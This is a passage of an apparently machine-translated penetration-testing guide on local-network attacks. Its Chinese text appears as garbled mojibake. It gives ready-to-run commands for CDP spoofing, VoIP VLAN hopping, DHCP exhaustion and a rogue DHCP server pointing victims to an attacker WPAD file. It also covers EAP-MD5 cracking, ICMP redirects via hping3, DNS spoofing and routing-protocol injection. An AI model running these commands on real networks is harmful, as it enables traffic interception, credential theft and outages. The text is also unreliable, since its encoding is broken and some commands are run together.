<p>åœ¨æ­¤æ”»å‡»ä¸­ï¼Œäº¤æ¢æœºçš„CPUå’ŒCDPé‚»å±…è¡¨è´Ÿæ‹…æ²‰é‡ï¼Œå¯¼è‡´é€šå¸¸æ‰€ç§°çš„**â€œç½‘ç»œç˜«ç—ªâ€**ï¼Œè¿™æ˜¯ç”±äºè¿‡åº¦çš„èµ„æºæ¶ˆè€—ã€‚</p>
<h4 id="cdpå†’å……æ”»å‡»"><a class="header" href="#cdpå†’å……æ”»å‡»">CDPå†’å……æ”»å‡»</a></h4>
<pre><code class="language-bash">sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
</code></pre>
<p>æ‚¨è¿˜å¯ä»¥ä½¿ç”¨ <a href="https://github.com/secdev/scapy/"><strong>scapy</strong></a>ã€‚ç¡®ä¿ä½¿ç”¨ <code>scapy/contrib</code> åŒ…è¿›è¡Œå®‰è£…ã€‚</p>
<h3 id="voipæ”»å‡»å’Œvoip-hopperå·¥å…·"><a class="header" href="#voipæ”»å‡»å’Œvoip-hopperå·¥å…·">VoIPæ”»å‡»å’ŒVoIP Hopperå·¥å…·</a></h3>
<p>VoIPç”µè¯ä¸ç‰©è”ç½‘è®¾å¤‡çš„é›†æˆæ—¥ç›Šå¢åŠ ï¼Œæä¾›äº†é€šè¿‡ç‰¹æ®Šç”µè¯å·ç è§£é”é—¨æˆ–æ§åˆ¶æ’æ¸©å™¨ç­‰åŠŸèƒ½ã€‚ç„¶è€Œï¼Œè¿™ç§é›†æˆå¯èƒ½ä¼šå¸¦æ¥å®‰å…¨é£é™©ã€‚</p>
<p>å·¥å…· <a href="http://voiphopper.sourceforge.net"><strong>voiphopper</strong></a> æ—¨åœ¨åœ¨å„ç§ç¯å¢ƒä¸­æ¨¡æ‹ŸVoIPç”µè¯ï¼ˆCiscoã€Avayaã€Nortelã€Alcatel-Lucentï¼‰ã€‚å®ƒä½¿ç”¨CDPã€DHCPã€LLDP-MEDå’Œ802.1Q ARPç­‰åè®®å‘ç°è¯­éŸ³ç½‘ç»œçš„VLAN IDã€‚</p>
<p><strong>VoIP Hopper</strong> ä¸ºCiscoå‘ç°åè®®ï¼ˆCDPï¼‰æä¾›ä¸‰ç§æ¨¡å¼ï¼š</p>
<ol>
<li><strong>å—…æ¢æ¨¡å¼</strong> (<code>-c 0</code>): åˆ†æç½‘ç»œæ•°æ®åŒ…ä»¥è¯†åˆ«VLAN IDã€‚</li>
<li><strong>æ¬ºéª—æ¨¡å¼</strong> (<code>-c 1</code>): ç”Ÿæˆè‡ªå®šä¹‰æ•°æ®åŒ…ï¼Œæ¨¡ä»¿å®é™…VoIPè®¾å¤‡çš„æ•°æ®åŒ…ã€‚</li>
<li><strong>ä½¿ç”¨é¢„åˆ¶æ•°æ®åŒ…çš„æ¬ºéª—æ¨¡å¼</strong> (<code>-c 2</code>): å‘é€ä¸ç‰¹å®šCisco IPç”µè¯å‹å·ç›¸åŒçš„æ•°æ®åŒ…ã€‚</li>
</ol>
<p>é€Ÿåº¦ä¼˜å…ˆçš„æ¨¡å¼æ˜¯ç¬¬ä¸‰ç§ã€‚å®ƒéœ€è¦æŒ‡å®šï¼š</p>
<ul>
<li>æ”»å‡»è€…çš„ç½‘ç»œæ¥å£ï¼ˆ<code>-i</code> å‚æ•°ï¼‰ã€‚</li>
<li>è¢«æ¨¡æ‹Ÿçš„VoIPè®¾å¤‡çš„åç§°ï¼ˆ<code>-E</code> å‚æ•°ï¼‰ï¼Œéµå¾ªCiscoå‘½åæ ¼å¼ï¼ˆä¾‹å¦‚ï¼ŒSEPåè·ŸMACåœ°å€ï¼‰ã€‚</li>
</ul>
<p>åœ¨ä¼ä¸šç¯å¢ƒä¸­ï¼Œä¸ºäº†æ¨¡ä»¿ç°æœ‰çš„VoIPè®¾å¤‡ï¼Œå¯ä»¥ï¼š</p>
<ul>
<li>æ£€æŸ¥ç”µè¯ä¸Šçš„MACæ ‡ç­¾ã€‚</li>
<li>æµè§ˆç”µè¯çš„æ˜¾ç¤ºè®¾ç½®ä»¥æŸ¥çœ‹å‹å·ä¿¡æ¯ã€‚</li>
<li>å°†VoIPè®¾å¤‡è¿æ¥åˆ°ç¬”è®°æœ¬ç”µè„‘ï¼Œå¹¶ä½¿ç”¨Wiresharkè§‚å¯ŸCDPè¯·æ±‚ã€‚</li>
</ul>
<p>åœ¨ç¬¬ä¸‰ç§æ¨¡å¼ä¸‹æ‰§è¡Œå·¥å…·çš„ç¤ºä¾‹å‘½ä»¤ä¸ºï¼š</p>
<pre><code class="language-bash">voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
</code></pre>
<h3 id="dhcp-æ”»å‡»"><a class="header" href="#dhcp-æ”»å‡»">DHCP æ”»å‡»</a></h3>
<h4 id="æšä¸¾"><a class="header" href="#æšä¸¾">æšä¸¾</a></h4>
<pre><code class="language-bash">nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
</code></pre>
<p><strong>DoS</strong></p>
<p><strong>ä¸¤ç§ç±»å‹çš„ DoS</strong> å¯ä»¥é’ˆå¯¹ DHCP æœåŠ¡å™¨æ‰§è¡Œã€‚ç¬¬ä¸€ç§æ˜¯ <strong>æ¨¡æ‹Ÿè¶³å¤Ÿå¤šçš„è™šå‡ä¸»æœºä»¥ä½¿ç”¨æ‰€æœ‰å¯èƒ½çš„ IP åœ°å€</strong>ã€‚<br />
æ­¤æ”»å‡»ä»…åœ¨æ‚¨èƒ½å¤Ÿçœ‹åˆ° DHCP æœåŠ¡å™¨çš„å“åº”å¹¶å®Œæˆåè®®æ—¶æœ‰æ•ˆ (<strong>Discover</strong> (Comp) --&gt; <strong>Offer</strong> (server) --&gt; <strong>Request</strong> (Comp) --&gt; <strong>ACK</strong> (server))ã€‚ä¾‹å¦‚ï¼Œè¿™åœ¨ <strong>Wifi ç½‘ç»œä¸­æ˜¯ä¸å¯è¡Œçš„</strong>ã€‚</p>
<p>æ‰§è¡Œ DHCP DoS çš„å¦ä¸€ç§æ–¹æ³•æ˜¯å‘é€ <strong>DHCP-RELEASE æ•°æ®åŒ…ï¼Œæºä»£ç ä½¿ç”¨æ¯ä¸ªå¯èƒ½çš„ IP</strong>ã€‚ç„¶åï¼ŒæœåŠ¡å™¨ä¼šè®¤ä¸ºæ¯ä¸ªäººéƒ½å·²ç»å®Œæˆäº†å¯¹è¯¥ IP çš„ä½¿ç”¨ã€‚</p>
<pre><code class="language-bash">yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
</code></pre>
<p>ä¸€ä¸ªæ›´è‡ªåŠ¨åŒ–çš„æ–¹æ³•æ˜¯ä½¿ç”¨å·¥å…· <a href="https://github.com/kamorin/DHCPig">DHCPing</a></p>
<p>æ‚¨å¯ä»¥ä½¿ç”¨ä¸Šè¿°çš„ DoS æ”»å‡»è¿«ä½¿å®¢æˆ·ç«¯åœ¨ç¯å¢ƒä¸­è·å–æ–°çš„ç§Ÿçº¦ï¼Œå¹¶è€—å°½åˆæ³•æœåŠ¡å™¨ï¼Œä½¿å…¶å˜å¾—æ— å“åº”ã€‚å› æ­¤ï¼Œå½“åˆæ³•å®¢æˆ·ç«¯å°è¯•é‡æ–°è¿æ¥æ—¶ï¼Œ<strong>æ‚¨å¯ä»¥æä¾›ä¸‹ä¸€ä¸ªæ”»å‡»ä¸­æåˆ°çš„æ¶æ„å€¼</strong>ã€‚</p>
<h4 id="è®¾ç½®æ¶æ„å€¼"><a class="header" href="#è®¾ç½®æ¶æ„å€¼">è®¾ç½®æ¶æ„å€¼</a></h4>
<p>å¯ä»¥ä½¿ç”¨ä½äº <code>/usr/share/responder/DHCP.py</code> çš„ DHCP è„šæœ¬è®¾ç½®ä¸€ä¸ªæµæ°“ DHCP æœåŠ¡å™¨ã€‚è¿™å¯¹äºç½‘ç»œæ”»å‡»éå¸¸æœ‰ç”¨ï¼Œä¾‹å¦‚é€šè¿‡å°†æµé‡é‡å®šå‘åˆ°æ¶æ„æœåŠ¡å™¨æ¥æ•è· HTTP æµé‡å’Œå‡­æ®ã€‚ç„¶è€Œï¼Œè®¾ç½®æµæ°“ç½‘å…³çš„æ•ˆæœè¾ƒå·®ï¼Œå› ä¸ºå®ƒä»…å…è®¸æ•è·å®¢æˆ·ç«¯çš„å‡ºç«™æµé‡ï¼Œæ— æ³•è·å–æ¥è‡ªçœŸå®ç½‘å…³çš„å“åº”ã€‚ç›¸åï¼Œå»ºè®®è®¾ç½®æµæ°“ DNS æˆ– WPAD æœåŠ¡å™¨ä»¥è¿›è¡Œæ›´æœ‰æ•ˆçš„æ”»å‡»ã€‚</p>
<p>ä»¥ä¸‹æ˜¯é…ç½®æµæ°“ DHCP æœåŠ¡å™¨çš„å‘½ä»¤é€‰é¡¹ï¼š</p>
<ul>
<li><strong>æˆ‘ä»¬çš„ IP åœ°å€ï¼ˆç½‘å…³å¹¿å‘Šï¼‰</strong>ï¼šä½¿ç”¨ <code>-i 10.0.0.100</code> å°†æ‚¨çš„æœºå™¨ IP å¹¿å‘Šä¸ºç½‘å…³ã€‚</li>
<li><strong>æœ¬åœ° DNS åŸŸå</strong>ï¼šå¯é€‰åœ°ä½¿ç”¨ <code>-d example.org</code> è®¾ç½®æœ¬åœ° DNS åŸŸåã€‚</li>
<li><strong>åŸå§‹è·¯ç”±å™¨/ç½‘å…³ IP</strong>ï¼šä½¿ç”¨ <code>-r 10.0.0.1</code> æŒ‡å®šåˆæ³•è·¯ç”±å™¨æˆ–ç½‘å…³çš„ IP åœ°å€ã€‚</li>
<li><strong>ä¸» DNS æœåŠ¡å™¨ IP</strong>ï¼šä½¿ç”¨ <code>-p 10.0.0.100</code> è®¾ç½®æ‚¨æ§åˆ¶çš„æµæ°“ DNS æœåŠ¡å™¨çš„ IP åœ°å€ã€‚</li>
<li><strong>æ¬¡çº§ DNS æœåŠ¡å™¨ IP</strong>ï¼šå¯é€‰åœ°ä½¿ç”¨ <code>-s 10.0.0.1</code> è®¾ç½®æ¬¡çº§ DNS æœåŠ¡å™¨ IPã€‚</li>
<li><strong>æœ¬åœ°ç½‘ç»œçš„å­ç½‘æ©ç </strong>ï¼šä½¿ç”¨ <code>-n 255.255.255.0</code> å®šä¹‰æœ¬åœ°ç½‘ç»œçš„å­ç½‘æ©ç ã€‚</li>
<li><strong>DHCP æµé‡çš„æ¥å£</strong>ï¼šä½¿ç”¨ <code>-I eth1</code> åœ¨ç‰¹å®šç½‘ç»œæ¥å£ä¸Šç›‘å¬ DHCP æµé‡ã€‚</li>
<li><strong>WPAD é…ç½®åœ°å€</strong>ï¼šä½¿ç”¨ <code>-w â€œhttp://10.0.0.100/wpad.datâ€</code> è®¾ç½® WPAD é…ç½®çš„åœ°å€ï¼Œä»¥ååŠ©ç½‘ç»œæµé‡æ‹¦æˆªã€‚</li>
<li><strong>ä¼ªé€ é»˜è®¤ç½‘å…³ IP</strong>ï¼šåŒ…æ‹¬ <code>-S</code> ä»¥ä¼ªé€ é»˜è®¤ç½‘å…³ IP åœ°å€ã€‚</li>
<li><strong>å“åº”æ‰€æœ‰ DHCP è¯·æ±‚</strong>ï¼šåŒ…æ‹¬ <code>-R</code> ä½¿æœåŠ¡å™¨å“åº”æ‰€æœ‰ DHCP è¯·æ±‚ï¼Œä½†è¦æ³¨æ„è¿™ä¼šäº§ç”Ÿå™ªéŸ³å¹¶å¯èƒ½è¢«æ£€æµ‹åˆ°ã€‚</li>
</ul>
<p>é€šè¿‡æ­£ç¡®ä½¿ç”¨è¿™äº›é€‰é¡¹ï¼Œå¯ä»¥æœ‰æ•ˆåœ°å»ºç«‹ä¸€ä¸ªæµæ°“ DHCP æœåŠ¡å™¨ä»¥æ‹¦æˆªç½‘ç»œæµé‡ã€‚</p>
<pre><code class="language-python"># Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
</code></pre>
<h3 id="eapæ”»å‡»"><a class="header" href="#eapæ”»å‡»"><strong>EAPæ”»å‡»</strong></a></h3>
<p>ä»¥ä¸‹æ˜¯å¯ä»¥é’ˆå¯¹802.1Xå®ç°ä½¿ç”¨çš„ä¸€äº›æ”»å‡»ç­–ç•¥ï¼š</p>
<ul>
<li>é€šè¿‡EAPè¿›è¡Œä¸»åŠ¨çš„æš´åŠ›ç ´è§£å¯†ç </li>
<li>ä½¿ç”¨æ ¼å¼é”™è¯¯çš„EAPå†…å®¹æ”»å‡»RADIUSæœåŠ¡å™¨ <em>**</em>(åˆ©ç”¨)</li>
<li>æ•è·EAPæ¶ˆæ¯å¹¶è¿›è¡Œç¦»çº¿å¯†ç ç ´è§£ï¼ˆEAP-MD5å’ŒPEAPï¼‰</li>
<li>å¼ºåˆ¶EAP-MD5èº«ä»½éªŒè¯ä»¥ç»•è¿‡TLSè¯ä¹¦éªŒè¯</li>
<li>åœ¨ä½¿ç”¨é›†çº¿å™¨æˆ–ç±»ä¼¼è®¾å¤‡è¿›è¡Œèº«ä»½éªŒè¯æ—¶æ³¨å…¥æ¶æ„ç½‘ç»œæµé‡</li>
</ul>
<p>å¦‚æœæ”»å‡»è€…ä½äºå—å®³è€…å’Œèº«ä»½éªŒè¯æœåŠ¡å™¨ä¹‹é—´ï¼Œä»–å¯ä»¥å°è¯•é™çº§ï¼ˆå¦‚æœ‰å¿…è¦ï¼‰èº«ä»½éªŒè¯åè®®åˆ°EAP-MD5å¹¶æ•è·èº«ä»½éªŒè¯å°è¯•ã€‚ç„¶åï¼Œä»–å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•è¿›è¡Œæš´åŠ›ç ´è§£ï¼š</p>
<pre><code>eapmd5pass â€“r pcap.dump â€“w /usr/share/wordlist/sqlmap.txt
</code></pre>
<h3 id="fhrp-glbp--hsrp-attacks"><a class="header" href="#fhrp-glbp--hsrp-attacks">FHRP (GLBP &amp; HSRP) Attacks <a href="#id-6196" id="id-6196"></a></a></h3>
<p><strong>FHRP</strong>ï¼ˆç¬¬ä¸€è·³å†—ä½™åè®®ï¼‰æ˜¯ä¸€ç±»æ—¨åœ¨<strong>åˆ›å»ºçƒ­å†—ä½™è·¯ç”±ç³»ç»Ÿ</strong>çš„ç½‘ç»œåè®®ã€‚é€šè¿‡FHRPï¼Œç‰©ç†è·¯ç”±å™¨å¯ä»¥ç»„åˆæˆä¸€ä¸ªå•ä¸€çš„é€»è¾‘è®¾å¤‡ï¼Œä»è€Œæé«˜å®¹é”™èƒ½åŠ›å¹¶å¸®åŠ©åˆ†é…è´Ÿè½½ã€‚</p>
<p><strong>æ€ç§‘ç³»ç»Ÿå·¥ç¨‹å¸ˆå¼€å‘äº†ä¸¤ç§FHRPåè®®ï¼ŒGLBPå’ŒHSRPã€‚</strong></p>
<p>{% content-ref url="glbp-and-hsrp-attacks.md" %}
<a href="glbp-and-hsrp-attacks.html">glbp-and-hsrp-attacks.md</a>
{% endcontent-ref %}</p>
<h3 id="rip"><a class="header" href="#rip">RIP</a></h3>
<p>å·²çŸ¥å­˜åœ¨ä¸‰ç§ç‰ˆæœ¬çš„è·¯ç”±ä¿¡æ¯åè®®ï¼ˆRIPï¼‰ï¼šRIPã€RIPv2å’ŒRIPngã€‚RIPå’ŒRIPv2é€šè¿‡UDPçš„520ç«¯å£å‘å¯¹ç­‰ä½“å‘é€æ•°æ®æŠ¥ï¼Œè€ŒRIPngåˆ™é€šè¿‡IPv6ç»„æ’­å‘UDPçš„521ç«¯å£å¹¿æ’­æ•°æ®æŠ¥ã€‚RIPv2å¼•å…¥äº†MD5è®¤è¯ã€‚å¦ä¸€æ–¹é¢ï¼ŒRIPngæ²¡æœ‰å†…ç½®è®¤è¯ï¼Œè€Œæ˜¯ä¾èµ–äºIPv6ä¸­çš„å¯é€‰IPsec AHå’ŒESPå¤´ã€‚</p>
<ul>
<li><strong>RIPå’ŒRIPv2ï¼š</strong> é€šè¿‡UDPæ•°æ®æŠ¥åœ¨520ç«¯å£è¿›è¡Œé€šä¿¡ã€‚</li>
<li><strong>RIPngï¼š</strong> åˆ©ç”¨UDPçš„521ç«¯å£é€šè¿‡IPv6ç»„æ’­å¹¿æ’­æ•°æ®æŠ¥ã€‚</li>
</ul>
<p>è¯·æ³¨æ„ï¼ŒRIPv2æ”¯æŒMD5è®¤è¯ï¼Œè€ŒRIPngä¸åŒ…æ‹¬å†…ç½®è®¤è¯ï¼Œä¾èµ–äºIPv6ä¸­çš„IPsec AHå’ŒESPå¤´ã€‚</p>
<h3 id="eigrp-attacks"><a class="header" href="#eigrp-attacks">EIGRP Attacks</a></h3>
<p><strong>EIGRPï¼ˆå¢å¼ºå‹å†…éƒ¨ç½‘å…³è·¯ç”±åè®®ï¼‰<strong>æ˜¯ä¸€ç§åŠ¨æ€è·¯ç”±åè®®ã€‚<strong>å®ƒæ˜¯ä¸€ç§è·ç¦»çŸ¢é‡åè®®ã€‚</strong> å¦‚æœæ²¡æœ‰</strong>è®¤è¯</strong>å’Œè¢«åŠ¨æ¥å£çš„é…ç½®ï¼Œ<strong>å…¥ä¾µè€…</strong>å¯ä»¥å¹²æ‰°EIGRPè·¯ç”±å¹¶å¯¼è‡´<strong>è·¯ç”±è¡¨ä¸­æ¯’</strong>ã€‚æ­¤å¤–ï¼ŒEIGRPç½‘ç»œï¼ˆæ¢å¥è¯è¯´ï¼Œè‡ªæ²»ç³»ç»Ÿï¼‰<strong>æ˜¯æ‰å¹³çš„ï¼Œæ²¡æœ‰åˆ’åˆ†ä¸ºä»»ä½•åŒºåŸŸ</strong>ã€‚å¦‚æœ<strong>æ”»å‡»è€…æ³¨å…¥ä¸€æ¡è·¯ç”±</strong>ï¼Œè¿™æ¡è·¯ç”±å¾ˆå¯èƒ½ä¼š<strong>ä¼ æ’­</strong>åˆ°æ•´ä¸ªè‡ªæ²»EIGRPç³»ç»Ÿã€‚</p>
<p>æ”»å‡»EIGRPç³»ç»Ÿéœ€è¦<strong>ä¸åˆæ³•çš„EIGRPè·¯ç”±å™¨å»ºç«‹é‚»å±…å…³ç³»</strong>ï¼Œè¿™æ‰“å¼€äº†è®¸å¤šå¯èƒ½æ€§ï¼Œä»åŸºæœ¬ä¾¦å¯Ÿåˆ°å„ç§æ³¨å…¥ã€‚</p>
<p><a href="https://frrouting.org/"><strong>FRRouting</strong></a>å…è®¸æ‚¨å®ç°<strong>æ”¯æŒBGPã€OSPFã€EIGRPã€RIPå’Œå…¶ä»–åè®®çš„è™šæ‹Ÿè·¯ç”±å™¨ã€‚</strong> æ‚¨åªéœ€åœ¨æ”»å‡»è€…çš„ç³»ç»Ÿä¸Šéƒ¨ç½²å®ƒï¼Œå®é™…ä¸Šå¯ä»¥å‡è£…æˆä¸ºè·¯ç”±åŸŸä¸­çš„åˆæ³•è·¯ç”±å™¨ã€‚</p>
<p>{% content-ref url="eigrp-attacks.md" %}
<a href="eigrp-attacks.html">eigrp-attacks.md</a>
{% endcontent-ref %}</p>
<p><a href="https://code.google.com/p/coly/"><strong>Coly</strong></a>å…·æœ‰æ‹¦æˆªEIGRPï¼ˆå¢å¼ºå‹å†…éƒ¨ç½‘å…³è·¯ç”±åè®®ï¼‰å¹¿æ’­çš„èƒ½åŠ›ã€‚å®ƒè¿˜å…è®¸æ³¨å…¥æ•°æ®åŒ…ï¼Œå¯ç”¨äºæ›´æ”¹è·¯ç”±é…ç½®ã€‚</p>
<h3 id="ospf"><a class="header" href="#ospf">OSPF</a></h3>
<p>åœ¨å¼€æ”¾æœ€çŸ­è·¯å¾„ä¼˜å…ˆï¼ˆOSPFï¼‰åè®®ä¸­ï¼Œ<strong>é€šå¸¸ä½¿ç”¨MD5è®¤è¯æ¥ç¡®ä¿è·¯ç”±å™¨ä¹‹é—´çš„å®‰å…¨é€šä¿¡</strong>ã€‚ç„¶è€Œï¼Œè¿™ä¸€å®‰å…¨æªæ–½å¯èƒ½ä¼šè¢«åƒLokiå’ŒJohn the Ripperè¿™æ ·çš„å·¥å…·ç ´åã€‚è¿™äº›å·¥å…·èƒ½å¤Ÿæ•è·å’Œç ´è§£MD5å“ˆå¸Œï¼Œæš´éœ²è®¤è¯å¯†é’¥ã€‚ä¸€æ—¦è·å¾—è¯¥å¯†é’¥ï¼Œå°±å¯ä»¥ç”¨æ¥å¼•å…¥æ–°çš„è·¯ç”±ä¿¡æ¯ã€‚è¦é…ç½®è·¯ç”±å‚æ•°å¹¶å»ºç«‹è¢«ç ´åçš„å¯†é’¥ï¼Œåˆ†åˆ«ä½¿ç”¨_æ³¨å…¥_å’Œ_è¿æ¥_é€‰é¡¹å¡ã€‚</p>
<ul>
<li><strong>æ•è·å’Œç ´è§£MD5å“ˆå¸Œï¼š</strong> ä½¿ç”¨Lokiå’ŒJohn the Ripperç­‰å·¥å…·ã€‚</li>
<li><strong>é…ç½®è·¯ç”±å‚æ•°ï¼š</strong> é€šè¿‡_æ³¨å…¥_é€‰é¡¹å¡è¿›è¡Œã€‚</li>
<li><strong>è®¾ç½®è¢«ç ´åçš„å¯†é’¥ï¼š</strong> å¯†é’¥åœ¨_è¿æ¥_é€‰é¡¹å¡ä¸‹é…ç½®ã€‚</li>
</ul>
<h3 id="other-generic-tools--sources"><a class="header" href="#other-generic-tools--sources">Other Generic Tools &amp; Sources</a></h3>
<ul>
<li><a href="https://github.com/c4s73r/Above"><strong>Above</strong></a>ï¼šæ‰«æç½‘ç»œæµé‡å¹¶æŸ¥æ‰¾æ¼æ´çš„å·¥å…·</li>
<li>æ‚¨å¯ä»¥åœ¨<a href="https://github.com/Sab0tag3d/MITM-cheatsheet"><strong>è¿™é‡Œ</strong></a>æ‰¾åˆ°ä¸€äº›<strong>å…³äºç½‘ç»œæ”»å‡»çš„æ›´å¤šä¿¡æ¯</strong>ã€‚</li>
</ul>
<h2 id="spoofing"><a class="header" href="#spoofing"><strong>Spoofing</strong></a></h2>
<p>æ”»å‡»è€…é€šè¿‡å‘é€è™šå‡çš„DHCPå“åº”æ¥é…ç½®ç½‘ç»œä¸­æ–°æˆå‘˜çš„æ‰€æœ‰ç½‘ç»œå‚æ•°ï¼ˆGWã€IPã€DNSï¼‰ã€‚</p>
<pre><code class="language-bash">Ettercap
yersinia dhcp -attack 2 #More parameters are needed
</code></pre>
<h3 id="arp-spoofing"><a class="header" href="#arp-spoofing">ARP Spoofing</a></h3>
<p>æŸ¥çœ‹<a href="./#arp-spoofing">ä¸Šä¸€èŠ‚</a>ã€‚</p>
<h3 id="icmpredirect"><a class="header" href="#icmpredirect">ICMPRedirect</a></h3>
<p>ICMPé‡å®šå‘æ˜¯å‘é€ä¸€ä¸ªICMPæ•°æ®åŒ…ç±»å‹1ä»£ç 5ï¼Œè¡¨ç¤ºæ”»å‡»è€…æ˜¯åˆ°è¾¾æŸä¸ªIPçš„æœ€ä½³æ–¹å¼ã€‚ç„¶åï¼Œå½“å—å®³è€…æƒ³è¦è”ç³»è¯¥IPæ—¶ï¼Œå®ƒå°†é€šè¿‡æ”»å‡»è€…å‘é€æ•°æ®åŒ…ã€‚</p>
<pre><code class="language-bash">Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
</code></pre>
<h3 id="dns-spoofing"><a class="header" href="#dns-spoofing">DNS Spoofing</a></h3>
<p>æ”»å‡»è€…å°†è§£æå—å®³è€…è¯·æ±‚çš„æŸäº›ï¼ˆæˆ–æ‰€æœ‰ï¼‰åŸŸåã€‚</p>
<pre><code class="language-bash">set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
</code></pre>
<p><strong>ä½¿ç”¨ dnsmasq é…ç½®è‡ªå·±çš„ DNS</strong></p>
<pre><code class="language-bash">apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" &gt; dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" &gt; dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
</code></pre>
<h3 id="æœ¬åœ°ç½‘å…³"><a class="header" href="#æœ¬åœ°ç½‘å…³">æœ¬åœ°ç½‘å…³</a></h3>
<p>ç³»ç»Ÿå’Œç½‘ç»œé€šå¸¸å­˜åœ¨å¤šä¸ªè·¯ç”±ã€‚åœ¨æœ¬åœ°ç½‘ç»œä¸­å»ºç«‹ MAC åœ°å€åˆ—è¡¨åï¼Œä½¿ç”¨ <em>gateway-finder.py</em> æ¥è¯†åˆ«æ”¯æŒ IPv4 è½¬å‘çš„ä¸»æœºã€‚</p>
<pre><code>root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
</code></pre>
<h3 id="spoofing-llmnr-nbt-ns-and-mdns"><a class="header" href="#spoofing-llmnr-nbt-ns-and-mdns"><a href="spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.html">Spoofing LLMNR, NBT-NS, and mDNS</a></a></h3>
<p>åœ¨DNSæŸ¥æ‰¾å¤±è´¥æ—¶ï¼ŒMicrosoftç³»ç»Ÿä¾èµ–äº<strong>é“¾è·¯æœ¬åœ°å¤šæ’­åç§°è§£æï¼ˆLLMNRï¼‰<strong>å’Œ</strong>NetBIOSåç§°æœåŠ¡ï¼ˆNBT-NSï¼‰<strong>è¿›è¡Œæœ¬åœ°ä¸»æœºè§£æã€‚åŒæ ·ï¼Œ<strong>Apple Bonjour</strong>å’Œ</strong>Linuxé›¶é…ç½®</strong>å®ç°åˆ©ç”¨**å¤šæ’­DNSï¼ˆmDNSï¼‰**åœ¨ç½‘ç»œä¸­å‘ç°ç³»ç»Ÿã€‚ç”±äºè¿™äº›åè®®çš„æœªç»èº«ä»½éªŒè¯çš„ç‰¹æ€§åŠå…¶é€šè¿‡UDPå¹¿æ’­æ¶ˆæ¯çš„æ“ä½œï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨å®ƒä»¬å°†ç”¨æˆ·é‡å®šå‘åˆ°æ¶æ„æœåŠ¡ã€‚</p>
<p>æ‚¨å¯ä»¥ä½¿ç”¨Responderä¼ªè£…ä¸»æœºæœç´¢çš„æœåŠ¡ï¼Œå‘é€è™šå‡å“åº”ã€‚<br />
åœ¨è¿™é‡Œé˜…è¯»æ›´å¤šå…³äº<a href="spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.html">å¦‚ä½•ä½¿ç”¨Responderä¼ªè£…æœåŠ¡çš„ä¿¡æ¯</a>ã€‚</p>
<h3 id="spoofing-wpad"><a class="header" href="#spoofing-wpad"><a href="spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.html">Spoofing WPAD</a></a></h3>
<p>æµè§ˆå™¨é€šå¸¸ä½¿ç”¨<strong>Webä»£ç†è‡ªåŠ¨å‘ç°ï¼ˆWPADï¼‰åè®®è‡ªåŠ¨è·å–ä»£ç†è®¾ç½®</strong>ã€‚è¿™æ¶‰åŠä»æœåŠ¡å™¨è·å–é…ç½®è¯¦ç»†ä¿¡æ¯ï¼Œå…·ä½“é€šè¿‡ä¸€ä¸ªURLï¼Œä¾‹å¦‚"http://wpad.example.org/wpad.dat"ã€‚å®¢æˆ·ç«¯å¯ä»¥é€šè¿‡å„ç§æœºåˆ¶å‘ç°æ­¤æœåŠ¡å™¨ï¼š</p>
<ul>
<li>é€šè¿‡<strong>DHCP</strong>ï¼Œå…¶ä¸­å‘ç°é€šè¿‡ä½¿ç”¨ç‰¹æ®Šä»£ç 252æ¡ç›®æ¥ä¿ƒè¿›ã€‚</li>
<li>é€šè¿‡<strong>DNS</strong>ï¼Œè¿™æ¶‰åŠåœ¨æœ¬åœ°åŸŸä¸­æœç´¢æ ‡è®°ä¸º_wpad_çš„ä¸»æœºåã€‚</li>
<li>é€šè¿‡<strong>Microsoft LLMNRå’ŒNBT-NS</strong>ï¼Œè¿™äº›æ˜¯DNSæŸ¥æ‰¾ä¸æˆåŠŸæ—¶ä½¿ç”¨çš„åå¤‡æœºåˆ¶ã€‚</li>
</ul>
